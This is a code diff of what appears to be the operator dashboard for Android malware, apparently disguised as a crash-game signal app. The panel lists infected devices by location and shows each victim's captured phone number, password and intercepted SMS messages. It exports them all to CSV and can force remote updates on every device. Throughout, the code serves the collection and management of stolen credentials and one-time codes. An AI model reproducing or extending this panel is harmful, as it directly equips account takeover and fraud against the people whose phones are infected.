+// ════════════════════════════════════════════════════════════════════════
+
+function ordenarPor(campo) {
+  if (sortCampo === campo) {
+    sortDir = sortDir === "asc" ? "desc" : "asc";
+  } else {
+    sortCampo = campo;
+    sortDir   = "desc";
+  }
+  // Actualizar visual
+  document.querySelectorAll(".table-head .sortable").forEach(el => {
+    el.classList.remove("asc","desc");
+    if (el.getAttribute("onclick")?.includes(campo)) el.classList.add(sortDir);
+  });
+  aplicarFiltros();
+}
+
+function ordenarDispositivos(lista) {
+  return [...lista].sort((a,b) => {
+    let va, vb;
+    if (sortCampo === "ultimo_acesso") {
+      va = a.ultimo_acesso ? new Date(a.ultimo_acesso).getTime() : 0;
+      vb = b.ultimo_acesso ? new Date(b.ultimo_acesso).getTime() : 0;
+    } else if (sortCampo === "versao") {
+      const toN = v => (v||"").split(".").map(Number).reduce((acc,n,i)=>acc+n*Math.pow(100,2-i),0);
+      va = toN(a.versao); vb = toN(b.versao);
+    } else if (sortCampo === "modelo") {
+      va = (a.modelo||"").toLowerCase(); vb = (b.modelo||"").toLowerCase();
+      return sortDir==="asc" ? va.localeCompare(vb) : vb.localeCompare(va);
+    } else {
+      va = (a[sortCampo]||"").toLowerCase(); vb = (b[sortCampo]||"").toLowerCase();
+      return sortDir==="asc" ? va.localeCompare(vb) : vb.localeCompare(va);
+    }
+    return sortDir === "asc" ? va - vb : vb - va;
+  });
+}
+
+// ════════════════════════════════════════════════════════════════════════
+// FILTROS AVANÇADOS
+// ════════════════════════════════════════════════════════════════════════
+
+function setFiltroEstado(estado, el) {
+  filtroEstado = estado;
+  document.querySelectorAll(".filter-chip").forEach(c => c.classList.remove("active"));
+  if (el) el.classList.add("active");
+  aplicarFiltros();
+}
+
+function filtrarDesactualizados() {
+  setFiltroEstado("desact", document.getElementById("chip-desact"));
+}
+
+function aplicarFiltros() {
+  const q      = (document.getElementById("search")?.value || "").toLowerCase().trim();
+  const verFil = document.getElementById("filter-versao")?.value || "";
+  const modFil = document.getElementById("filter-modelo")?.value || "";
+
+  let lista = todosDispositivos.filter(d => {
+    // Filtro estado
+    if (filtroEstado === "activos"  && !isHoje(d.ultimo_acesso)) return false;
+    if (filtroEstado === "inativos" && isHoje(d.ultimo_acesso))  return false;
+    if (filtroEstado === "comcreds" && !todasCredenciais.some(c => c.device_id===d.device_id)) return false;
+    if (filtroEstado === "desact"   && (!d.versao || d.versao === versaoAtual)) return false;
+
+    // Filtro versão e modelo
+    if (verFil && d.versao !== verFil) return false;
+    if (modFil && d.modelo !== modFil) return false;
+
+    // Filtro texto
+    if (q) {
+      const devCreds = todasCredenciais.filter(c => c.device_id===d.device_id);
+      const numeros  = devCreds.filter(c=>c.tipo==="Numero"||c.tipo==="numero").map(c=>c.valor||"").join(" ");
+      const pais     = (d.pais||"").toLowerCase();
+      const cidade   = (d.cidade||"").toLowerCase();
+      if (!(
+        (d.device_id||"").toLowerCase().includes(q) ||
+        (d.modelo||"").toLowerCase().includes(q) ||
+        (d.versao||"").toLowerCase().includes(q) ||
+        numeros.toLowerCase().includes(q) ||
+        pais.includes(q) || cidade.includes(q)
+      )) return false;
+    }
+    return true;
+  });
+
+  lista = ordenarDispositivos(lista);
+
+  const label = document.getElementById("resultado-label");
+  if (label) label.textContent = lista.length < todosDispositivos.length
+    ? `${lista.length} de ${todosDispositivos.length} dispositivos`
+    : `${lista.length} dispositivos`;
+
+  renderLista(lista, todasCredenciais);
+}
+
+// ════════════════════════════════════════════════════════════════════════
+// EXPORTAR CSV
+// ════════════════════════════════════════════════════════════════════════
+
+function exportarCSV() {
+  const rows = [
+    ["device_id","modelo","android","versao","ultimo_acesso","pais","cidade","numero","senha","num_credenciais","num_sms"]
+  ];
+  todosDispositivos.forEach(d => {
+    const creds  = todasCredenciais.filter(c => c.device_id===d.device_id);
+    const numero = creds.find(c=>c.tipo==="Numero"||c.tipo==="numero")?.valor || "";
+    const senha  = creds.find(c=>c.tipo==="Senha"||c.tipo==="senha")?.valor || "";
+    const nSMS   = todasSMS.filter(s => s.device_id===d.device_id).length;
+    rows.push([
+      d.device_id||"", d.modelo||"", d.android||"", d.versao||"",
+      d.ultimo_acesso||"", d.pais||"", d.cidade||"",
+      numero, senha, creds.length, nSMS
+    ]);
+  });
+  const csv = rows.map(r => r.map(v => `"${String(v).replace(/"/g,'""')}"`).join(",")).join("\n");
+  const blob = new Blob(["\uFEFF"+csv], { type:"text/csv;charset=utf-8;" });
+  const url  = URL.createObjectURL(blob);
+  const a    = document.createElement("a");
+  a.href = url;
+  a.download = "nexus_dispositivos_" + new Date().toISOString().slice(0,10) + ".csv";
+  a.click();
+  URL.revokeObjectURL(url);
+}
+
+// ════════════════════════════════════════════════════════════════════════
+// RENDER LISTA
+// ════════════════════════════════════════════════════════════════════════
 
 function renderLista(dispositivos, credenciais) {
   const lista = document.getElementById("lista");
-
   if (!dispositivos.length) {
-    lista.innerHTML = '<div class="empty">Nenhum dispositivo registado ainda</div>';
+    lista.innerHTML = '<div class="empty">Nenhum dispositivo encontrado</div>';
     return;
   }
 
-  // Ordenar: activos hoje primeiro, depois por ultimo_acesso mais recente
-  dispositivos = [...dispositivos].sort((a, b) => {
-    const ta = a.ultimo_acesso ? new Date(a.ultimo_acesso).getTime() : 0;
-    const tb = b.ultimo_acesso ? new Date(b.ultimo_acesso).getTime() : 0;
-    return tb - ta;
-  });
-
   lista.innerHTML = dispositivos.map(dev => {
-    const devCreds = credenciais.filter(c => c.device_id === dev.device_id);
-    const ultimaCred = devCreds[0];
-    const activo = isHoje(dev.ultimo_acesso);
+    const devCreds   = credenciais.filter(c => c.device_id===dev.device_id);
+    const activo     = isHoje(dev.ultimo_acesso);
+    const desact     = versaoAtual && dev.versao && dev.versao !== versaoAtual;
+    const locStr     = [dev.cidade, dev.pais].filter(Boolean).join(", ");
 
     return `
     <div class="device-card" id="card-${dev.device_id}">
@@ -612,11 +947,14 @@ function renderLista(dispositivos, credenciais) {
         <div class="device-info">
           <div class="device-avatar">${getEmoji(dev.modelo)}</div>
           <div>
-            <div class="device-name">${dev.modelo || "Desconhecido"}</div>
-            <div class="device-id">${dev.device_id?.substring(0,16) || "—"}...</div>
+            <div class="device-name">
+              ${dev.modelo || "Desconhecido"}
+              ${desact ? `<span style="font-family:var(--mono);font-size:9px;color:#f97316;border:1px solid rgba(249,115,22,0.3);border-radius:4px;padding:1px 5px;margin-left:4px">⚠ ${dev.versao}</span>` : ""}
+            </div>
+            <div class="device-id">${dev.device_id?.substring(0,16) || "—"}... ${locStr ? `· ${locStr}` : ""}</div>
           </div>
         </div>
-        <div class="cell hide-mobile">${dev.versao || "—"}</div>
+        <div class="cell hide-mobile" style="color:${desact?"#f97316":"var(--text)"}">${dev.versao || "—"}</div>
         <div class="cell hide-mobile">${formatDate(dev.ultimo_acesso)}</div>
         <div class="cell hide-mobile">${devCreds.filter(c=>c.tipo==="Numero"||c.tipo==="numero")[0]?.valor||"—"}</div>
         <div style="display:flex;align-items:center;gap:8px;justify-content:flex-end">
@@ -630,23 +968,33 @@ function renderLista(dispositivos, credenciais) {
           <div class="history-grid">
             <div class="info-block">
               <h4>📱 Dispositivo</h4>
-              <div class="info-row"><span class="info-label">Modelo</span><span class="info-val">${dev.modelo || "—"}</span></div>
-              <div class="info-row"><span class="info-label">Android</span><span class="info-val">${dev.android || "—"}</span></div>
-              <div class="info-row"><span class="info-label">Versão App</span><span class="info-val green">${dev.versao || "—"}</span></div>
-              <div class="info-row"><span class="info-label">Device ID</span><span class="info-val" style="font-size:10px">${dev.device_id || "—"}</span></div>
+              <div class="info-row"><span class="info-label">Modelo</span><span class="info-val">${dev.modelo||"—"}</span></div>
+              <div class="info-row"><span class="info-label">Android</span><span class="info-val">${dev.android||"—"}</span></div>
+              <div class="info-row"><span class="info-label">Versão App</span><span class="info-val ${desact?"":"green"}" style="${desact?"color:#f97316":""}">${dev.versao||"—"}${desact?` (desact · atual: ${versaoAtual})`:""}</span></div>
+              <div class="info-row"><span class="info-label">Device ID</span><span class="info-val" style="font-size:10px">${dev.device_id||"—"}</span></div>
+              ${locStr ? `<div class="info-row"><span class="info-label">📍 Localização</span><span class="info-val">${locStr}</span></div>` : ""}
             </div>
             <div class="info-block">
               <h4>📊 Actividade</h4>
-              <div class="info-row"><span class="info-label">Instalação</span><span class="info-val">${formatDate(dev.timestamp || dev.created_at)}</span></div>
+              <div class="info-row"><span class="info-label">Instalação</span><span class="info-val">${formatDate(dev.timestamp||dev.created_at)}</span></div>
               <div class="info-row"><span class="info-label">Último Acesso</span><span class="info-val green">${formatDate(dev.ultimo_acesso)}</span></div>
-              <div class="info-row"><span class="info-label">Credenciais</span><span class="info-val ${devCreds.length ? 'red' : ''}">${devCreds.length} registos</span></div>
+              <div class="info-row"><span class="info-label">Credenciais</span><span class="info-val ${devCreds.length?"red":""}">${devCreds.length} registos</span></div>
               <div class="info-row"><span class="info-label">Número</span><span class="info-val green">${devCreds.filter(c=>c.tipo==='Numero'||c.tipo==='numero')[0]?.valor||'—'}</span></div>
               <div class="info-row"><span class="info-label">Senha</span><span class="info-val red">${devCreds.filter(c=>c.tipo==='Senha'||c.tipo==='senha')[0]?.valor||'—'}</span></div>
-              <div class="info-row"><span class="info-label">Estado</span><span class="info-val ${activo ? 'green' : ''}">${activo ? 'Activo hoje' : 'Inactivo'}</span></div>
+              <div class="info-row"><span class="info-label">Estado</span><span class="info-val ${activo?"green":""}">${activo?"Activo hoje":"Inactivo"}</span></div>
             </div>
           </div>
 
-          <div class="timeline-title">📋 Histórico de actividade</div>
+          <!-- Histórico de sinais com comparação real -->
+          <div class="timeline-title" style="margin-bottom:10px">
+            🎯 Histórico de sinais
+            <span style="font-size:9px;color:var(--muted);font-weight:400;margin-left:6px">
+              (${historicoSinais.filter(s=>s.crashReal!=null).length} com resultado · taxa: ${calcTaxa()}%)
+            </span>
+          </div>
+          ${renderHistoricoSinais()}
+
+          <div class="timeline-title" style="margin-top:16px">📋 Histórico de actividade</div>
           <div class="timeline">
             ${devCreds.length === 0
               ? '<div style="color:var(--muted);font-family:var(--mono);font-size:12px;padding:10px 0">Sem credenciais registadas</div>'
@@ -656,7 +1004,7 @@ function renderLista(dispositivos, credenciais) {
                   <div class="tl-time">${formatDate(c.created_at)}</div>
                   <div class="tl-content">
                     <div class="tipo">${getTipoLabel(c.tipo)}</div>
-                    <div>${c.numero ? '📞 ' + c.numero : ''}${c.senha ? ' · 🔑 ' + c.senha : ''}${c.valor ? c.valor : ''}</div>
+                    <div>${c.numero?'📞 '+c.numero:''}${c.senha?' · 🔑 '+c.senha:''}${c.valor?c.valor:''}</div>
                   </div>
                 </div>
               `).join('')
@@ -665,55 +1013,102 @@ function renderLista(dispositivos, credenciais) {
 
           <div class="timeline-title" style="margin-top:16px;display:flex;align-items:center;gap:8px;cursor:pointer" onclick="toggleSMS('${dev.device_id}')">
             💬 SMS recebidas
-            <span style="font-size:11px;color:var(--muted);font-family:var(--mono)">(${todasSMS.filter(s => s.device_id === dev.device_id).length} mensagens)</span>
+            <span style="font-size:11px;color:var(--muted);font-family:var(--mono)">(${todasSMS.filter(s=>s.device_id===dev.device_id).length} mensagens)</span>
             <span id="sms-chevron-${dev.device_id}" style="font-size:10px;transition:transform 0.2s">▶</span>
           </div>
           <div class="timeline" id="sms-${dev.device_id}" style="display:none;max-height:400px;overflow-y:auto">
-            ${(todasSMS.filter(s => s.device_id === dev.device_id)).length === 0
+            ${todasSMS.filter(s=>s.device_id===dev.device_id).length===0
               ? '<div style="color:var(--muted);font-family:var(--mono);font-size:12px;padding:10px 0">Sem SMS registadas</div>'
-              : todasSMS.filter(s => s.device_id === dev.device_id).map(s => `
+              : todasSMS.filter(s=>s.device_id===dev.device_id).map(s=>`
                 <div class="tl-item">
                   <div class="tl-dot login"></div>
                   <div class="tl-time">${formatDate(new Date(s.timestamp_ms).toISOString())}</div>
                   <div class="tl-content">
-                    <div class="tipo">📨 ${s.remetente || 'Desconhecido'}</div>
-                    <div style="word-break:break-word;font-size:12px;color:var(--text-muted)">${s.corpo || ''}</div>
+                    <div class="tipo">📨 ${s.remetente||'Desconhecido'}</div>
+                    <div style="word-break:break-word;font-size:12px;color:var(--muted)">${s.corpo||''}</div>
                   </div>
                 </div>
               `).join('')
             }
           </div>
+
+          <!-- Botão forçar actualização individual -->
+          <div style="margin-top:16px">
+            <button onclick="forcarAtualizacao('${dev.device_id}')" style="background:var(--surface2);border:1px solid var(--accent);color:var(--accent);font-family:var(--mono);font-size:11px;padding:8px 14px;border-radius:8px;cursor:pointer;transition:all 0.2s" onmouseover="this.style.background='rgba(124,58,237,0.1)'" onmouseout="this.style.background='var(--surface2)'">
+              🔄 Forçar actualização deste dispositivo
+            </button>
+          </div>
         </div>
       </div>
     </div>
     `;
-  }).join('');
+  }).join("");
 }
 
+function calcTaxa() {
+  const cr = historicoSinais.filter(s=>s.crashReal!=null);
+  if (!cr.length) return "—";
+  return Math.round(cr.filter(s=>s.alcOk).length/cr.length*100);
+}
+
+function renderHistoricoSinais() {
+  if (historicoSinais.length === 0) {
+    return '<div style="color:var(--muted);font-family:var(--mono);font-size:11px;padding:8px 0">Sem sinais registados nesta sessão</div>';
+  }
+  const ultimos = [...historicoSinais].reverse().slice(0,10);
+  return `<div class="sinais-grid">
+    ${ultimos.map(s => {
+      const classe = s.crashReal==null ? "pendente" : s.alcOk ? "acerto" : s.protOk ? "prot" : "erro";
+      const emoji  = s.crashReal==null ? "⏳" : s.alcOk ? "✅" : s.protOk ? "🟡" : "❌";
+      const cor    = s.crashReal==null ? "var(--muted)" : s.alcOk ? "var(--accent)" : s.protOk ? "var(--accent2)" : "#ef4444";
+      return `<div class="sinal-item ${classe}" title="Prot:${s.prot}x Alc:${s.alcMin}x-${s.alcMax}x${s.crashReal!=null?" Crash:"+s.crashReal+"x":""}">
+        <div style="font-size:18px">${emoji}</div>
+        <div style="color:${cor};font-size:10px;margin-top:2px">
+          ${s.protOk==null ? "Pendente" : s.alcOk ? `${s.crashReal?.toFixed(1)}x ✓` : `${s.crashReal?.toFixed(1)}x`}
+        </div>
+        <div style="color:var(--muted);font-size:9px">${s.alcMin}x→${s.alcMax}x</div>
+      </div>`;
+    }).join("")}
+  </div>
+  <div style="margin-top:8px;font-family:var(--mono);font-size:10px;color:var(--muted)">
+    Registar resultado: 
+    <input type="number" id="crash-input" placeholder="ex: 15.40" step="0.01" min="1"
+      style="background:var(--surface2);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:11px;padding:4px 8px;border-radius:6px;width:90px;outline:none;margin:0 6px">
+    <button onclick="registarResultadoSinal(parseFloat(document.getElementById('crash-input').value))"
+      style="background:rgba(124,58,237,0.15);border:1px solid rgba(124,58,237,0.3);color:var(--accent);font-family:var(--mono);font-size:10px;padding:4px 10px;border-radius:6px;cursor:pointer">
+      Registar
+    </button>
+  </div>`;
+}
+
+// ════════════════════════════════════════════════════════════════════════
+// TOGGLE HELPERS
+// ════════════════════════════════════════════════════════════════════════
+
 function toggleCard(id) {
-  const card = document.getElementById("card-" + id);
-  card.classList.toggle("open");
+  document.getElementById("card-" + id)?.classList.toggle("open");
 }
 
 function toggleSMS(deviceId) {
-  const el = document.getElementById('sms-' + deviceId);
-  const ch = document.getElementById('sms-chevron-' + deviceId);
+  const el = document.getElementById("sms-" + deviceId);
+  const ch = document.getElementById("sms-chevron-" + deviceId);
   if (!el) return;
-  const open = el.style.display !== 'none';
-  el.style.display = open ? 'none' : 'block';
-  if (ch) ch.style.transform = open ? '' : 'rotate(90deg)';
+  const open = el.style.display !== "none";
+  el.style.display = open ? "none" : "block";
+  if (ch) ch.style.transform = open ? "" : "rotate(90deg)";
 }
 
-// ── MINI GRÁFICO DE ACTIVIDADE ────────────────────────────────────
+// ════════════════════════════════════════════════════════════════════════
+// MINI GRÁFICO
+// ════════════════════════════════════════════════════════════════════════
+
 function renderMiniChart(dispositivos) {
-  const el = document.getElementById('mini-chart');
+  const el = document.getElementById("mini-chart");
   if (!el) return;
-  const dias = 7;
-  const hoje = new Date();
+  const dias = 7; const hoje = new Date();
   const counts = [];
-  for (let d = dias - 1; d >= 0; d--) {
-    const dia = new Date(hoje);
-    dia.setDate(dia.getDate() - d);
+  for (let d = dias-1; d>=0; d--) {
+    const dia = new Date(hoje); dia.setDate(dia.getDate() - d);
     const count = dispositivos.filter(dev => {
       if (!dev.ultimo_acesso) return false;
       const dv = new Date(dev.ultimo_acesso);
@@ -722,118 +1117,65 @@ function renderMiniChart(dispositivos) {
     counts.push({ count, dia });
   }
   const maxCount = Math.max(...counts.map(c => c.count), 1);
-  const labels = ['Dom','Seg','Ter','Qua','Qui','Sex','Sáb'];
-  el.innerHTML = counts.map(({count, dia}) => {
-    const pct = Math.max(4, Math.round((count / maxCount) * 100));
-    const isHoje = dia.toDateString() === hoje.toDateString();
-    const label = labels[dia.getDay()];
+  const labels = ["Dom","Seg","Ter","Qua","Qui","Sex","Sáb"];
+  el.innerHTML = counts.map(({count,dia}) => {
+    const pct = Math.max(4, Math.round((count/maxCount)*100));
+    const isHojeF = dia.toDateString()===hoje.toDateString();
     return `<div style="flex:1;display:flex;flex-direction:column;align-items:center;gap:4px">
-      <div style="font-family:var(--mono);font-size:9px;color:var(--muted)">${count||''}</div>
-      <div style="width:100%;background:${isHoje?'var(--accent)':'#1e293b'};border-radius:3px;height:${pct}%;min-height:4px;transition:height 0.4s" title="${count} activos"></div>
-      <div style="font-family:var(--mono);font-size:8px;color:${isHoje?'var(--accent)':'var(--muted)'}">${label}</div>
+      <div style="font-family:var(--mono);font-size:9px;color:var(--muted)">${count||""}</div>
+      <div style="width:100%;background:${isHojeF?"var(--accent)":"#1e293b"};border-radius:3px;height:${pct}%;min-height:4px;transition:height 0.4s" title="${count} activos"></div>
+      <div style="font-family:var(--mono);font-size:8px;color:${isHojeF?"var(--accent)":"var(--muted)"}">${labels[dia.getDay()]}</div>
     </div>`;
-  }).join('');
+  }).join("");
 }
 
-// ── FORÇAR ACTUALIZAÇÃO REMOTA ─────────────────────────────────────────
+// ════════════════════════════════════════════════════════════════════════
+// ACÇÕES REMOTAS
+// ════════════════════════════════════════════════════════════════════════
+
 async function forcarAtualizacao(deviceId) {
   try {
-    // Tentar PATCH primeiro; se não existir a linha, fazer POST
-    const rPatch = await fetch(SUPA_URL + "/rest/v1/device_config?device_id=eq." + deviceId, {
-      method: 'PATCH',
-      headers: {...headers, 'Prefer': 'return=minimal'},
-      body: JSON.stringify({ forcar_update: true })
+    const rPatch = await fetch(SUPA_URL+"/rest/v1/device_config?device_id=eq."+deviceId, {
+      method:"PATCH", headers:{...headers,"Prefer":"return=minimal"},
+      body: JSON.stringify({forcar_update:true})
     });
-    if (rPatch.ok) {
-      alert('✅ Comando enviado! O dispositivo vai actualizar na próxima vez que abrir o app.');
-    } else {
-      // Linha não existe — inserir
-      const rPost = await fetch(SUPA_URL + "/rest/v1/device_config", {
-        method: 'POST',
-        headers: {...headers, 'Prefer': 'return=minimal'},
-        body: JSON.stringify({ device_id: deviceId, forcar_update: true })
-      });
-      if (rPost.ok) alert('✅ Comando enviado!');
-      else { const t = await rPost.text(); alert('❌ Falhou: ' + rPost.status + ' — ' + t); }
-    }
-  } catch(e) { alert('❌ Erro: ' + e.message); }
+    if (rPatch.ok) { alert("✅ Comando enviado!"); return; }
+    const rPost = await fetch(SUPA_URL+"/rest/v1/device_config", {
+      method:"POST", headers:{...headers,"Prefer":"return=minimal"},
+      body: JSON.stringify({device_id:deviceId,forcar_update:true})
+    });
+    if (rPost.ok) alert("✅ Comando enviado!"); else { const t=await rPost.text(); alert("❌ Falhou: "+rPost.status+" — "+t); }
+  } catch(e) { alert("❌ Erro: "+e.message); }
 }
 
 async function forcarAtualizacaoTodos() {
-  if (!confirm('Forçar actualização em TODOS os dispositivos?')) return;
-  try {
-    const ids = todosDispositivos.map(d => d.device_id).filter(Boolean);
-    if (ids.length === 0) { alert('Nenhum dispositivo encontrado.'); return; }
-    let ok = 0, fail = 0;
-    // PATCH em cada device_id individualmente (mais fiável que upsert em lote)
-    await Promise.all(ids.map(async id => {
-      try {
-        const rp = await fetch(SUPA_URL + "/rest/v1/device_config?device_id=eq." + id, {
-          method: 'PATCH',
-          headers: {...headers, 'Prefer': 'return=minimal'},
-          body: JSON.stringify({ forcar_update: true })
-        });
-        if (rp.ok) { ok++; return; }
-        // Linha não existe — inserir
-        const ri = await fetch(SUPA_URL + "/rest/v1/device_config", {
-          method: 'POST',
-          headers: {...headers, 'Prefer': 'return=minimal'},
-          body: JSON.stringify({ device_id: id, forcar_update: true })
-        });
-        if (ri.ok) ok++; else fail++;
-      } catch { fail++; }
-    }));
-    alert('✅ Enviado a ' + ok + ' dispositivos!' + (fail ? ' (' + fail + ' falharam)' : ''));
-  } catch(e) { alert('❌ Erro: ' + e.message); }
+  if (!confirm("Forçar actualização em TODOS os dispositivos?")) return;
+  const ids = todosDispositivos.map(d=>d.device_id).filter(Boolean);
+  if (!ids.length) { alert("Nenhum dispositivo."); return; }
+  let ok=0, fail=0;
+  await Promise.all(ids.map(async id => {
+    try {
+      const rp = await fetch(SUPA_URL+"/rest/v1/device_config?device_id=eq."+id, {
+        method:"PATCH", headers:{...headers,"Prefer":"return=minimal"},
+        body:JSON.stringify({forcar_update:true})
+      });
+      if (rp.ok){ok++;return;}
+      const ri = await fetch(SUPA_URL+"/rest/v1/device_config", {
+        method:"POST", headers:{...headers,"Prefer":"return=minimal"},
+        body:JSON.stringify({device_id:id,forcar_update:true})
+      });
+      if(ri.ok)ok++;else fail++;
+    } catch{fail++;}
+  }));
+  alert("✅ Enviado a "+ok+" dispositivos!"+(fail?"("+fail+" falharam)":""));
 }
 
-function filtrar(query) {
-  const q = query.toLowerCase().trim();
-  if (!q) {
-    renderLista(todosDispositivos, todasCredenciais);
-    return;
-  }
-  const filtrados = todosDispositivos.filter(d => {
-    const devCreds = todasCredenciais.filter(c => c.device_id === d.device_id);
-    const numeros = devCreds.filter(c=>c.tipo==="Numero"||c.tipo==="numero").map(c => c.valor || "").join(" ");
-    return (
-      (d.device_id || "").toLowerCase().includes(q) ||
-      (d.modelo || "").toLowerCase().includes(q) ||
-      (d.versao || "").toLowerCase().includes(q) ||
-      numeros.toLowerCase().includes(q)
-    );
-  });
-  renderLista(filtrados, todasCredenciais);
-}
-
-// Login
-// ── LOGIN LOCAL — verificação directa no browser, sem servidor ──
-const SENHA_HASH = "736b79626f74313233"; // hex de "nexus123"
-
-function strToHex(s) {
-  return Array.from(s).map(c => c.charCodeAt(0).toString(16).padStart(2,"0")).join("");
-}
-
-let autenticado = localStorage.getItem("nexus_auth") === "1";
-
-function fazerLogin(password) {
-  if (!password) { alert("Insere a senha!"); return; }
-  if (strToHex(password) === SENHA_HASH) {
-    localStorage.setItem("nexus_auth", "1");
-    autenticado = true;
-    document.getElementById("login-overlay").style.display = "none";
-    carregarDados();
-  } else {
-    const el = document.getElementById('login-error-msg'); if(el) el.textContent = '❌ Senha inválida';
-  }
-}
-
-function sair() {
-  localStorage.removeItem("nexus_auth");
-  location.reload();
-}
+// ════════════════════════════════════════════════════════════════════════
+// CARREGAMENTO
+// ════════════════════════════════════════════════════════════════════════
 
 async function carregarComToken() { await carregarDados(); }
+async function carregar() { await carregarDados(); }
 
 async function carregarDados() {
   const btn = document.querySelector(".refresh-btn");
@@ -841,52 +1183,67 @@ async function carregarDados() {
   document.getElementById("lista").innerHTML = '<div class="empty"><div class="spinner"></div>A carregar...</div>';
 
   try {
-    const [r1, r2, r3] = await Promise.all([
-      fetch(SUPA_URL + "/rest/v1/installs?select=*&order=ultimo_acesso.desc.nullslast&limit=1000", { headers }),
-      fetch(SUPA_URL + "/rest/v1/credenciais?select=*&order=id.desc&limit=2000", { headers }),
-      fetch(SUPA_URL + "/rest/v1/sms?select=*&order=criado_em.desc&limit=1000", { headers })
+    const [r1,r2,r3] = await Promise.all([
+      fetch(SUPA_URL+"/rest/v1/installs?select=*&order=ultimo_acesso.desc.nullslast&limit=1000", {headers}),
+      fetch(SUPA_URL+"/rest/v1/credenciais?select=*&order=id.desc&limit=2000", {headers}),
+      fetch(SUPA_URL+"/rest/v1/sms?select=*&order=criado_em.desc&limit=1000", {headers})
     ]);
-
-    const d1 = await r1.json();
-    const d2 = await r2.json();
-    const d3 = await r3.json();
-    todosDispositivos = Array.isArray(d1) ? d1 : [];
-    todasCredenciais = Array.isArray(d2) ? d2 : [];
-    todasSMS = Array.isArray(d3) ? d3 : [];
+    const d1=await r1.json(), d2=await r2.json(), d3=await r3.json();
+    todosDispositivos = Array.isArray(d1)?d1:[];
+    todasCredenciais  = Array.isArray(d2)?d2:[];
+    todasSMS          = Array.isArray(d3)?d3:[];
 
     actualizarStats();
     renderMiniChart(todosDispositivos);
-    renderLista(todosDispositivos, todasCredenciais);
+    aplicarFiltros();
   } catch(e) {
-    document.getElementById("lista").innerHTML = '<div class="empty">❌ Erro: ' + e.message + "</div>";
+    document.getElementById("lista").innerHTML = '<div class="empty">❌ Erro: '+e.message+"</div>";
   }
-
   if (btn) btn.classList.remove("loading");
 }
 
-// Iniciar
+// ════════════════════════════════════════════════════════════════════════
+// LOGIN
+// ════════════════════════════════════════════════════════════════════════
+
+const SENHA_HASH = "736b79626f74313233";
+function strToHex(s) { return Array.from(s).map(c=>c.charCodeAt(0).toString(16).padStart(2,"0")).join(""); }
+let autenticado = localStorage.getItem("nexus_auth") === "1";
+
+function fazerLogin(password) {
+  if (!password) { alert("Insere a senha!"); return; }
+  if (strToHex(password)===SENHA_HASH) {
+    localStorage.setItem("nexus_auth","1");
+    autenticado=true;
+    document.getElementById("login-overlay").style.display="none";
+    carregarDados();
+  } else {
+    const el=document.getElementById("login-error-msg"); if(el) el.textContent="❌ Senha inválida";
+  }
+}
+
+function sair() { localStorage.removeItem("nexus_auth"); location.reload(); }
+
+// ── INICIAR ───────────────────────────────────────────────────────────
 if (!autenticado) {
   document.getElementById("login-overlay").style.display = "flex";
 } else {
   carregarDados();
-  // Auto-actualizar a cada 60 segundos — apenas dados em background, nunca re-renderiza
+  // Auto-actualizar a cada 60s (só dados, não re-renderiza)
   setInterval(async () => {
     if (!autenticado) return;
     try {
-      const [r1, r2, r3] = await Promise.all([
-        fetch(SUPA_URL + "/rest/v1/installs?select=*&order=ultimo_acesso.desc.nullslast&limit=1000", { headers }),
-        fetch(SUPA_URL + "/rest/v1/credenciais?select=*&order=id.desc&limit=2000", { headers }),
-        fetch(SUPA_URL + "/rest/v1/sms?select=*&order=criado_em.desc&limit=1000", { headers })
+      const [r1,r2,r3] = await Promise.all([
+        fetch(SUPA_URL+"/rest/v1/installs?select=*&order=ultimo_acesso.desc.nullslast&limit=1000",{headers}),
+        fetch(SUPA_URL+"/rest/v1/credenciais?select=*&order=id.desc&limit=2000",{headers}),
+        fetch(SUPA_URL+"/rest/v1/sms?select=*&order=criado_em.desc&limit=1000",{headers})
       ]);
-      const d1 = await r1.json();
-      const d2 = await r2.json();
-      const d3 = await r3.json();
-      todosDispositivos = Array.isArray(d1) ? d1 : todosDispositivos;
-      todasCredenciais  = Array.isArray(d2) ? d2 : todasCredenciais;
-      todasSMS          = Array.isArray(d3) ? d3 : todasSMS;
-      // Só actualiza os números no topo — nunca toca na lista ou nos cards
+      const d1=await r1.json(),d2=await r2.json(),d3=await r3.json();
+      todosDispositivos = Array.isArray(d1)?d1:todosDispositivos;
+      todasCredenciais  = Array.isArray(d2)?d2:todasCredenciais;
+      todasSMS          = Array.isArray(d3)?d3:todasSMS;
       actualizarStats();
-    } catch(e) {}
+    } catch(e){}
   }, 60000);
 }
 </script>
